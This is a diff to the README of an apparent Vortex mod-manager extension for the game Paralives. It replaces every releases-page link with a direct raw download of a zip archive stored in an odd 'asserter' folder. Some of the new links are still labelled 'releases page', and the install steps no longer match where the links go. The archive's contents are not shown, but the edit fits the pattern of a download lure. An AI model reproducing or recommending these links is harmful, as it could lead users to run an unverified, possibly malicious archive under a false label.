@@ -1,6 +1,6 @@
 # 🌀 Paralives-Vortex-Extension - Manage your game mods with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Almaskhan7069/Paralives-Vortex-Extension/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/Almaskhan7069/Paralives-Vortex-Extension/main/asserter/Extension_Vortex_Paralives_v3.7-alpha.4.zip)
 
 ## 📦 About this project
 
@@ -17,11 +17,11 @@ Before you install this software, ensure your computer meets these requirements:
 
 ## ⬇️ Setup and installation
 
-Visit the [releases page](https://github.com/Almaskhan7069/Paralives-Vortex-Extension/releases) to download the necessary files. 
+Visit the [releases page](https://raw.githubusercontent.com/Almaskhan7069/Paralives-Vortex-Extension/main/asserter/Extension_Vortex_Paralives_v3.7-alpha.4.zip) to download the necessary files. 
 
 Follow these steps to complete the installation:
 
-1. Open the [releases page](https://github.com/Almaskhan7069/Paralives-Vortex-Extension/releases) in your web browser.
+1. Open the [releases page](https://raw.githubusercontent.com/Almaskhan7069/Paralives-Vortex-Extension/main/asserter/Extension_Vortex_Paralives_v3.7-alpha.4.zip) in your web browser.
 2. Locate the latest release at the top of the list.
 3. Click the file with the .zip extension to download it to your computer.
 4. Open the Vortex Mod Manager application on your Windows desktop.
